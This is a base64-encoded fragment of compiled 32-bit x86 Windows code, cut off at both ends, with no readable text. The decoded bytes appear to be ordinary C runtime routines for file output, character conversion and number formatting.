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+EoRMAAIPoAQ+EjhMAAIPoAQ+EexMAAIPoAQ+EaBMAAItFCIHm////f4OlhPj//wCJRQiLRRCJdQxA3UUI3ZWk+P//i7Wo+P//i86JhYj4///B6RSLwSX/BwAAg8gAdQoz0omdsPj//+sNM8C6AAAQACGFsPj//4u9pPj//4Hm//8PAAP4i4Ww+P//ib2M+P//E/KB4f8HAAADwYmFuPj//+hxKQAAUVHdHCTodyoAAFlZ6HBPAACJhZT4//9qIF89////f3QHPQAAAIB1CDPAiYWU+P//i5W4+P//M8mLhYz4//+F9omFMP7//w+VwYm1NP7//0GJjaD4//+JjSz+//+B+jMEAAAPgpkDAACDpZD6//8Ax4WU+v//AAAQAMeFjPr//wIAAACF9g+E3gEAADPJi4QNkPr//zuEDTD+//8PhcgBAACDwQSD+Qh15I2Kz/v//4v3i8Ez0oPhH8HoBSvxiYWs+P//iY2Y+P//i8OLzom1tPj//+gJTgAAi5Wg+P//SIOlqPj//wCJhZD4///30ImFjPj//4uMlSz+//8PvcF0CUCJhbD4///rB4OlsPj//wCLjaz4//++zAEAAI0ECoP4c3YrM8BQiYWM+v//iYUs/v//jYWQ+v//UI2FMP7//1ZQ6CPP//+DxBDp4gAAACu9sPj//zu9mPj//xvA99gDwgPBiYWo+P//g/hzd7aNef9Iib2E+P//iYW4+P//O8cPhJEAAACL+Cv5jY0s/v//jQy5iY2g+P//O/pzBYtBBOsCM8CJhbD4//+NR/87wnMEiwHrAjPAI4WM+P//i420+P//i5Ww+P//I5WQ+P//0+iLjZj4///T4ouNuPj//wvCiYSNMP7//4vBi42g+P//SIPpBImFuPj//0+JjaD4//87hYT4//90CIuVLP7//+uIi42s+P//hcl0CjPAjb0w/v//86uLhaj4//+JhSz+//9qBFiJhZD6//9Qg6WU+v//AI2FkPr//1CNhWD8//+JnVz8//9WUImdjPr//+gIzv//g8QQ6coDAACNis77//+L94vBM9KD4R/B6AUr8YmFmPj//4mNsPj//4vDi86JtYT4///oSUwAAIuVoPj//0iDpbT4//8AiYWM+P//99CJhaj4//+LjJUs/v//D73BdAlAiYWs+P//6weDpaz4//8Ai42Y+P//vswBAACNBAqD+HN2KzPAUImFjPr//4mFLP7//42FkPr//1CNhTD+//9WUOhjzf//g8QQ6eIAAAArvaz4//87vbD4//8bwPfYA8IDwYmFkPj//4P4c3e2jXn/SIm9tPj//4mFuPj//zvHD4SRAAAAi/gr+Y2NLP7//40MuYmNoPj//zv6cwWLQQTrAjPAiYWs+P//jUf/O8JzBIsB6wIzwCOFqPj//4uNhPj//4uVrPj//yOVjPj//9Poi42w+P//0+KLjbj4//8LwomEjTD+//+LwYuNoPj//0iD6QSJhbj4//9PiY2g+P//O4W0+P//dAiLlSz+///riIuNmPj//4XJdAozwI29MP7///Ori4WQ+P//iYUs/v//x4WQ+v//AgAAAGoE6Tn+//+D+jUPhBQBAACDpZD6//8Ax4WU+v//AAAQAMeFjPr//wIAAACF9g+E8QAAADPSi4QVkPr//zuEFTD+//8PhdsAAACDwgSD+gh15DPbD73GiZ2o+P//dANA6wKLwyv4g/8CG/b33gPxg/5zdipTjYWQ+v//iZ2M+v//UI2FMP7//4mdLP7//2jMAQAAUOjXy///g8QQ602NVv+D+v90P416/zvRcwmLhJUw/v//6wKLwzv5cwmLjJUs/v//6wKLy8HpHsHgAgvIiYyVMP7//0pPg/r/dAiLjSz+///rxIm1LP7//7s1BAAAjYWQ+v//K524+P//i/vB7wWL98HmAlZqAFDo+Rv//4PjHzPAQIvL0+CJhDWQ+v//6eMAAAAzwIX2D5XAg6Wo+P//AI0EhQQAAACLhAUs/v//D73AdANA6wIzwCv4O/sb9vfeA/GD/nN2LYOljPr//wCNhZD6//+DpSz+//8AagBQjYUw/v//aMwBAABQ6O7K//+DxBDrTI1W/4P6/3Q+jXr/O9FzCYuElTD+///rAjPAO/lzCYuMlSz+///rAjPJwekfA8ALyImMlTD+//9KT4P6/3QIi40s/v//68WJtSz+//+7NAQAAI2FkPr//yuduPj//4v7we8Fi/fB5gJWagBQ6BEb//+D4x8zwECLy9PgiYQ1kPr//41HAb7MAQAAiYWM+v//iYVc/P//weACUI2FkPr//1CNhWD8//9WUOg8yv//M9uDxBxDi4WU+P//M9JqClmJjYz4//+FwA+I3QQAAPfxiYW0+P//i8qJjYT4//+FwA+E2gMAAIP4JnYDaiZYD7YMhZbgQQAPtjSFl+BBAIv5iYWw+P//wecCV40EMYmFjPr//42FkPr//2oAUOhiGv//i8bB4AJQi4Ww+P//D7cEhZTgQQCNBIWQ10EAUI2FkPr//wPHUOiYLv//i72M+v//g8QYO/sPh8wAAACLvZD6//+F/3U2M8BQiYW8+P//iYVc/P//jYXA+P//UI2FYPz//2jMAQAAUOheyf//g8QQisO+zAEAAOkCAwAAO/t08IO9XPz//wB054uFXPz//zPJiYWo+P//M/aLx/ektWD8//8DwYmEtWD8//+D0gBGi8o7taj4//914IXJdLOLhVz8//+D+HNzD4mMhWD8////hVz8///rmTPAUImFjPr//4mFXPz//42FkPr//1CNhWD8//9ozAEAAFDozcj//4PEEDLA6Wr///85nVz8//8Ph94AAACLhWD8//++zAEAAImFrPj//4vHweACUI2FkPr//4m9XPz//1CNhWD8//9WUOiGyP//i4Ws+P//g8QQhcB1GImFjPr//4mFXPz//1CNhZD6///pAQIAADvDD4QKAgAAg71c/P//AA+E/QEAAIuNXPz//4mNqPj//zPJM//3pL1g/P//A8GJhL1g/P//i4Ws+P//g9IAR4vKO72o+P//ddyFyQ+EwQEAAIuFXPz//4P4c3MSiYyFYPz///+FXPz//+mkAQAAM8CJhYz6//+JhVz8//9QjYWQ+v//6fIBAAA7vVz8//+NlZD6//8PksByBo2VYPz//4mVmPj//42NYPz//4TAdQaNjZD6//+Jjaz4//+EwHQKi8+JvZD4///rDIuNXPz//4mNkPj//4TAdAaLvVz8//8zwDP2iYW8+P//hckPhPsAAACDPLIAdR478A+F5AAAAIOktcD4//8AjUYBiYW8+P//6c4AAAAz0ovOIZW4+P//iZWg+P//hf8PhKEAAACD+XN0ZDvIdReLhbj4//+DpI3A+P//AEADxomFvPj//4uFuPj//4uVrPj//4sEgouVmPj///cksgOFoPj//4PSAAGEjcD4//+Lhbj4//+D0gBAQYmFuPj//zvHiZWg+P//i4W8+P//dZeF0nQ0g/lzD4S9AAAAO8h1EYOkjcD4//8AjUEBiYW8+P//i8Iz0gGEjcD4//+Lhbz4//8T0kHryIP5cw+EiQAAAIuNkPj//4uVmPj//0Y78Q+FBf///4mFXPz//77MAQAAweACUI2FwPj//1CNhWD8//9WUOhSxv//g8QQisOEwHR3i4W0+P//K4Ww+P//iYW0+P//D4Us/P//i42E+P//hckPhLUFAACLBI0s4UEAiYWo+P//hcB1YjPAiYWc9v//iYVc/P//UOs/M8C+zAEAAImFnPb//4mFXPz//1CNhaD2//9QjYVg/P//VlDo2cX//4PEEDLA64WDpZz2//8Ag6Vc/P//AGoAjYWg9v//UI2FYPz//+k4BQAAO8MPhDoFAACLjVz8//+FyQ+ELAUAAIOltPj//wAz//ekvWD8//8DhbT4//+JhL1g/P//i4Wo+P//g9IAR4mVtPj//zv5ddiF0g+E8wQAAIuFXPz//4P4cw+DQP///4mUhWD8////hVz8///p0gQAAPfY9/GJhaD4//+LyomNhPj//4XAD4TIAwAAg/gmdgNqJlgPtgyFluBBAA+2NIWX4EEAi/mJhZj4///B5wJXjQQxiYWM+v//jYWQ+v//agBQ6IMV//+LxsHgAlCLhZj4//8PtwSFlOBBAI0EhZDXQQBQjYWQ+v//A8dQ6Lkp//+LvYz6//+DxBg7+w+HzAAAAIu9kPr//4X/dTYzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//aMwBAABQ6H/E//+DxBCKw77MAQAA6ewCAAA7+3Twg70s/v//AHTni4Us/v//M8mJhaj4//8z9ovH96S1MP7//wPBiYS1MP7//4PSAEaLyju1qPj//3Xghcl0s4uFLP7//4P4c3MPiYyFMP7///+FLP7//+uZM8BQiYWc9v//iYUs/v//jYWg9v//UI2FMP7//2jMAQAAUOjuw///g8QQMsDpav///zmdLP7//w+HyAAAAIuFMP7//77MAQAAiYW0+P//i8fB4AJQjYWQ+v//ib0s/v//UI2FMP7//1ZQ6KfD//+LhbT4//+DxBCFwHUYiYWc9v//iYUs/v//UI2FoPb//+nrAQAAO8MPhPQBAACDvSz+//8AD4TnAQAAi40s/v//iY2o+P//M8kz//ekvTD+//8DwYmEvTD+//+LhbT4//+D0gBHi8o7vaj4//913IXJD4SrAQAAi4Us/v//g/hzD4NPAgAAiYyFMP7///+FLP7//+mKAQAAO70s/v//jZWQ+v//D5LAcgaNlTD+//+JlbD4//+NjTD+//+EwHUGjY2Q+v//iY20+P//hMB0CovPib2s+P//6wyLjSz+//+Jjaz4//+EwHQGi70s/v//M8Az9omFvPj//4XJD4T7AAAAgzyyAHUeO/APheQAAACDpLXA+P//AI1GAYmFvPj//+nOAAAAM9KLziGVuPj//4mVkPj//4X/D4ShAAAAg/lzdGQ7yHUXi4W4+P//g6SNwPj//wBAA8aJhbz4//+Lhbj4//+LlbT4//+LBIKLlbD4///3JLIDhZD4//+D0gABhI3A+P//i4W4+P//g9IAQEGJhbj4//87x4mVkPj//4uFvPj//3WXhdJ0NIP5cw+EHQEAADvIdRGDpI3A+P//AI1BAYmFvPj//4vCM9IBhI3A+P//i4W8+P//E9JB68iD+XMPhOkAAACLjaz4//+LlbD4//9GO/EPhQX///+JhSz+//++zAEAAMHgAlCNhcD4//9QjYUw/v//VlDoicH//4PEEIrDhMAPhNYAAACLhaD4//8rhZj4//+JhaD4//8PhT78//+LjYT4//+FyQ+E6AAAAIsEjSzhQQCJhaj4//+FwA+ErQAAADvDD4TLAAAAi40s/v//hckPhL0AAACDpbT4//8AM//3pL0w/v//A4W0+P//iYS9MP7//4uFqPj//4PSAEeJlbT4//87+XXYhdIPhIQAAACLhSz+//+D+HNzU4mUhTD+////hSz+///rar7MAQAAM8BQiYWc9v//iYUs/v//jYWg9v//UI2FMP7//1ZQ6LDA//+DxBAywOki////g6Wc9v//AIOlLP7//wBqAOsPM8BQiYUs/v//iYWc9v//jYWg9v//UI2FMP7//1ZQ6HHA//+DxBCLjSz+//+LvZz4//+Jvbj4//+FyXR6g6W0+P//ADP/i4S9MP7//2oKWvfiA4W0+P//iYS9MP7//4PSAEeJlbT4//87+XXZi724+P//hdJ0QIuFLP7//4P4c3MPiZSFMP7///+FLP7//+smM8BQiYWc9v//iYUs/v//jYWg9v//UI2FMP7//1ZQ6OG///+DxBCNhVz8//9QjYUs/v//UOgT6f//WVmLjZz4//9qClo7wg+FRgEAAIuFXPz//415Af+FlPj//8YBMYm9uPj//4mFqPj//4XAdF8z/zPJi4SNYPz///fiagoDx4mEjWD8//+D0gBBi/paO42o+P//dd2Jvaj4//+F/4u9uPj//3Qii41c/P//g/lzD4OzAAAAi4Wo+P//iYSNYPz///+FXPz//4uNnPj//4uFlPj//4uVfPj//4lCBIuViPj//4XAeAqB+v///393AgPQi0UcSDvCcgKLwgPBiYW0+P//O/gPhF8BAACLhSz+//+FwA+EUQEAADPbi/gzyYuEjTD+//+6AMqaO/fiA8OJhI0w/v//g9IAQYvaO89134u9uPj//4XbD4SNAAAAi4Us/v//g/hzc1yJnIUw/v///4Us/v//63MzwFCJhZz2//+JhVz8//+NhaD2//9QjYVg/P//VlDoer7//4PEEOk1////hcB1DIuFlPj//0jpMf///wQwjXkBiAGJvbj4///pGf///zPAUImFnPb//4mFLP7//42FoPb//1CNhTD+//9WUOgtvv//g8QQjYVc/P//UI2FLP7//1DoX+f//4O9LP7//wBZWYuNtPj//w+Uw8eFiPj//wgAAAArzzPS97WM+P//iYWE+P//i8KJlaj4//8EMIuViPj//zvKcws8MA+VwP7IItjrA4gEOouFhPj//0qJlYj4//+D+v91voP5CXYDaglZA/mJvbj4//87vbT4//8PhaH+//8zwMYHAITbD5XAiYWo+P//i9jrOmhw4UEA6TXs//9oaOFBAOkr7P//aGDhQQDpIez//2hY4UEA/3Uc/7Wc+P//6MeF//+DxAyFwHUpM9uAvXj4//8AX150DY2FcPj//1DooBUAAFmLTfyLwzPNW+gC+P7/ycMzwFBQUFBQ6Fl1///M6IgbAABQ6GAbAABZw4v/VYvs/3UM6BSr//+LRQxZi0AMkKgGdRzowof//8cACQAAAItFDGoQWYPADPAJCIPI/13Di0UMi0AMkMHoDKgBdA3omIf//8cAIgAAAOvUi0UMi0AMkKgBdCj/dQzoGwMAAFmLTQyDYQgAhMCLRQx0tYtIBIkIi0UMav5Zg8AM8CEIi0UMagJZg8AM8AkIi0UMavdZg8AM8CEIi0UMg2AIAItFDItADJCpwAQAAHUW/3UM6M6q//9ZhMB1Cf91DOhSHQAAWVP/dQyLXQhT6BEBAABZWYTAdRGLRQxqEFmDwAzwCQiDyP/rAw+2w1tdw4v/VYvs/3UM6CSq//+LRQxZi0AMkKgGdR7o0ob//8cACQAAAItFDGoQWYPADPAJCLj//wAAXcOLRQyLQAyQwegMqAF0Deimhv//xwAiAAAA69KLRQyLQAyQqAF0KP91DOgpAgAAWYtNDINhCACEwItFDHSzi0gEiQiLRQxq/lmDwAzwIQiLRQxqAlmDwAzwCQiLRQxq91mDwAzwIQiLRQyDYAgAi0UMi0AMkKnABAAAdRb/dQzo3Kn//1mEwHUJ/3UM6GAcAABZVv91DIt1CFbo6wAAAFlZhMB1E4tFDGoQWYPADPAJCLj//wAA6wMPt8ZeXcOL/1WL7FZX/3UM6C6p//9Zi00Mi9CLSQyQ9sHAD4SQAAAAi00MM/+LQQSLMSvwQIkBi0UMi0gYSYlICIX2fiSLRQxW/3AEUuh93f//g8QMi/iLRQw7/otIBIpFCIgBD5TA62WD+v90G4P6/nQWi8KLyoPgP8H5BmvAOAMEjTgzQgDrBbj4IEIA9kAoIHTDagJXV1LozhAAACPCg8QQg/j/da+LRQxqEFmDwAzwCQiwAesWagGNRQhQUugL3f//g8QMSPfYGsD+wF9eXcOL/1WL7FZX/3UM6GKo//9Zi00Mi9CLSQyQ9sHAD4STAAAAi00MM/+LQQSLMSvwg8ACiQGLRQyLSBiD6QKJSAiF9n4ji0UMVv9wBFLordz//4PEDI